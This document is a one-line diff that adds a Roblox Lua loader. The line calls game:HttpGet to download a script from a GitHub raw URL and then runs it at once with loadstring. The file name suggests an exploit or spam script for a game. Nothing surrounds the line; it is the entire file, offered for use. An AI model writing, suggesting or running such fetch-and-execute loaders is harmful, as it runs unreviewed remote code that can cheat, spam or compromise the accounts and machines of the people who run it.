@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AssemblyLook/loaders/main/loaders/huntress-nightmare-spam2-pbjy4oo5mdqj0m.lua"))()
